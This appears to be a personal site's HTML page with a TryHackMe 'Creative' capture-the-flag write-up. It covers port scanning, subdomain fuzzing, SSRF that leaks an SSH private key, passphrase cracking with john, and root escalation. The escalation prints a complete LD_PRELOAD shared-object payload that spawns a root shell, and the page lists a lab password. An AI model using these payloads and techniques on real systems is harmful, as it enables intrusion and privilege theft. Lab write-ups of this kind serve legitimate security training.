@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Creative - W4RSH3LL</title>
+
+    <!-- Styles -->
+    <link rel="stylesheet" href="../../../css/style.css">
+    <link rel="stylesheet" href="../../../css/write_up.css">
+    <link rel="icon" type="image/png" href="../../../assets/favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/svg+xml" href="../../../assets/favicon.svg">
+    <link rel="shortcut icon" href="../../../assets/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../assets/apple-touch-icon.png">
+    <link rel="manifest" href="../../../assets/site.webmanifest">
+</head>
+
+<body>
+
+<!-- Background -->
+<div class="background-overlay"></div>
+<div class="particles"></div>
+
+<!-- Navigation -->
+<nav>
+    <div class="logo-container">
+        <img src="../../../assets/leviathan_profil_pic.jpg" alt="W4RSH3LL Avatar" class="avatar">
+        <span class="logo-text">W4RSH3LL</span>
+        <button class="menu-toggle" aria-label="Toggle menu">&#9776;</button>
+    </div>
+    <ul class="menu">
+        <li><a href="../../../index.html">Home</a></li>
+        <li><a href="../../../html/about.html">About</a></li>
+        <li><a href="../../../html/projects.html">Projects</a></li>
+        <li><a href="../../../html/certifications.html">Certifications</a></li>
+        <li><a href="../../../html/documentations.html">Documentations</a></li>
+        <li><a href="../../../html/write-ups.html" class="active">Write-ups</a></li>
+        <li><a href="../../../html/skills.html">Skills</a></li>
+    </ul>
+</nav>
+
+<!-- WRITE-UP CONTENT WRAPPED IN REPORT SECTION -->
+<section class="report-section">
+<article class="about-page">
+
+    <h1 class="section-title">TryHackMe - Creative Write-up</h1>
+    <img src="../creative/assets/creative.svg">
+
+        <!-- Overview -->
+        <h2>Machine Overview</h2>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.93.36</li>
+            <li><strong>Title:</strong> Creative</li>
+            <li><strong>Difficulty:</strong> Easy</li>
+        </ul>
+        <hr>
+
+        <h2>Important Notes</h2>
+        <p>No important notes on this write-up...</p>
+        <hr>
+
+        <h2>Nmap Port Scan</h2>
+        <p>First off, we will run 3 nmap scans.</p>
+
+        <h4>Scan 1:</h4>
+        <pre><code>nmap 10.10.93.36</code></pre>
+
+        <p><strong>Output:</strong></p>
+<pre><code>22/tcp  open  ssh
+80/tcp  open  http</code></pre>
+
+        <h4>Scan 2:</h4>
+        <pre><code>nmap -sC -sV -A 10.10.93.36</code></pre>
+
+        <p><strong>Output:</strong></p>
+<pre><code>map scan report for creative.thm (10.10.93.36)  
+Host is up (0.044s latency).  
+Not shown: 998 filtered tcp ports (no-response)  
+PORT    STATE SERVICE VERSION  
+22/tcp open  ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.5  
+| ssh-hostkey:  
+|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b  
+|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb  
+|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89  
+80/tcp open  http   nginx 1.18.0 (Ubuntu)  
+|_http-title: Creative Studio | Free Bootstrap 4.3.x template  
+|_http-server-header: nginx/1.18.0 (Ubuntu)  
+</code></pre>
+
+        <h4>Scan 3:</h4>
+        <pre><code>nmap -p- 10.10.93.36</code></pre>
+
+        <p><strong>Output:</strong></p>
+<pre><code>22/tcp  open  ssh
+80/tcp  open  http</code></pre>
+
+    <hr>
+
+    <p>When we go to:<br>http://10.10.93.36:80</p>
+
+    <p>We see: <strong>http://creative.thm/</strong> in the URL, which means we have to manually add this to our <code>/etc/hosts</code>.</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218112820.png" alt="">
+    </figure>
+
+    <p>Then we land on the main page:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218112850.png" alt="">
+    </figure>
+
+    <p>After scrolling for a bit, we find a contact form at the bottom:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218113001.png" alt="">
+    </figure>
+
+    <p>And we also see a components page:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218113021.png" alt="">
+    </figure>
+
+    <p>We can attempt an XSS in every input form:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218113144.png" alt="">
+    </figure>
+
+    <p>The XSS failed on these inputs.</p>
+
+    <p>I also remembered from the nmap scan that it was running nginx:</p>
+
+<pre><code>80/tcp open  http nginx 1.18.0 (Ubuntu)
+</code></pre>
+
+    <p>From here we can enumerate directories and files using <strong>FFuf</strong>:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218114738.png" alt="">
+    </figure>
+
+    <p>All of these are 301 redirects (permanently moved).  
+    We can try enumerating subdomains with:</p>
+
+<pre><code>ffuf -w subdomains.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6
+</code></pre>
+
+    <p>Thus, we found:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218115826.png" alt="">
+    </figure>
+
+    <p>Then we add it to our <code>/etc/hosts</code>:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218120302.png" alt="">
+    </figure>
+
+    <p>And lastly we visit: <strong>http://beta.creative.thm</strong></p>
+
+    <p>Thus we land on:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218120326.png" alt="">
+    </figure>
+
+    <p>We try different payloads here, which leads us to:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218120357.png" alt="">
+    </figure>
+
+    <p>Let's try hitting our local machine with it...</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218120642.png" alt="">
+    </figure>
+
+    <p>And it works!</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218120635.png" alt="">
+    </figure>
+
+    <p>It seems like there is nothing else here — we need to dig deeper using <strong>SSRF</strong>.</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218125124.png" alt="">
+    </figure>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218125133.png" alt="">
+    </figure>
+
+    <p>With SSRF, we should be able to list files on the internal server...</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218125914.png" alt="">
+    </figure>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218125922.png" alt="">
+    </figure>
+
+    <p>From here we find:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218130200.png" alt="">
+    </figure>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218130209.png" alt="">
+    </figure>
+
+    <p>We then create <code>id_rsa</code>:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218130542.png" alt="">
+    </figure>
+
+    <p>Set permissions:</p>
+
+<pre><code>chmod 600 id_rsa</code></pre>
+
+    <p>Then SSH into it:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218130734.png" alt="">
+    </figure>
+
+    <p>And then we need a passphrase...</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218130806.png" alt="">
+    </figure>
+
+<pre><code>ssh2john id_rsa > hash
+john --wordlist=rockyou.txt hash
+</code></pre>
+
+    <p>Password cracked:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218131016.png" alt="">
+    </figure>
+
+    <p>Now we SSH in:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218131104.png" alt="">
+    </figure>
+
+    <p>We list directories:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218131230.png" alt="">
+    </figure>
+
+    <p>We grab <code>user.txt</code> and inspect <code>.bash_history</code>:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218131322.png" alt="">
+    </figure>
+
+    <p>We create <code>shell.c</code> for privilege escalation:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218131634.png" alt="">
+    </figure>
+
+<pre><code>#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+</code></pre>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218131931.png" alt="">
+    </figure>
+
+<pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
+</code></pre>
+
+    <p>Password for <strong>saad</strong>:</p>
+    <code>MyStrongestPasswordYet$4291</code>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218132246.png" alt="">
+    </figure>
+
+    <p>Privilege escalation successful:</p>
+
+    <figure>
+        <img src="../creative/assets/Pasted image 20250218132316.png" alt="">
+    </figure>
+
+    <p>Retrieved <strong>root.txt</strong>.</p>
+
+</article>
+</section>
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="footer-container">
+        <p>&copy; 2025 W4RSH3LL. All rights reserved.</p>
+
+        <div class="footer-links">
+
+            <!-- Email -->
+            <a href="mailto:w4rsh3ll@pm.me" class="footer-link" title="Email">
+                <svg class="footer-icon" viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 
+                2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 
+                2-2zm0 2v.01L12 13l8-6.99V6H4zm0 
+                12h16V8l-8 6-8-6v10z"/></svg>
+                <span>w4rsh3ll@pm.me</span>
+            </a>
+
+            <!-- GitHub -->
+            <a href="https://github.com/w4rsh3ll" target="_blank" class="footer-link" title="GitHub">
+                <svg class="footer-icon" viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 
+                12c0 5.3 3.438 9.8 8.205 
+                11.387.6.113.82-.26.82-.577v-2.256c-3.338.726-4.033-1.61-4.033-1.61-.546-1.387-1.333-1.757-1.333-1.757-1.09-.745.083-.729.083-.729 
+                1.205.085 1.84 1.236 1.84 
+                1.236 1.07 1.834 2.807 1.304 
+                3.492.997.108-.775.418-1.304.762-1.604-2.665-.304-5.466-1.332-5.466-5.93 
+                0-1.31.467-2.38 1.235-3.22-.123-.303-.535-1.523.117-3.176 
+                0 0 1.008-.322 3.301 1.23a11.52 
+                11.52 0 0 1 3.003-.404c1.02.005 
+                2.047.138 3.004.404 2.291-1.552 
+                3.297-1.23 3.297-1.23.655 1.653.243 
+                2.873.12 3.176.77.84 1.232 
+                1.91 1.232 3.22 0 4.61-2.807 
+                5.624-5.48 5.922.43.37.823 1.102.823 
+                2.222v3.293c0 .32.217.694.825.576A12.01 
+                12.01 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+                <span>github.com/w4rsh3ll</span>
+            </a>
+
+            <!-- TryHackMe SVG -->
+            <a href="https://tryhackme.com/p/W4RSH3LL" target="_blank" class="footer-link" title="TryHackMe">
+                <svg class="footer-icon" viewBox="0 0 46.069 46.069" fill="currentColor">…</svg>
+                <span>tryhackme.com/W4RSH3LL</span>
+            </a>
+
+        </div>
+    </div>
+</footer>
+<script src="../../../js/script.js"></script>
+</body>
+</html>
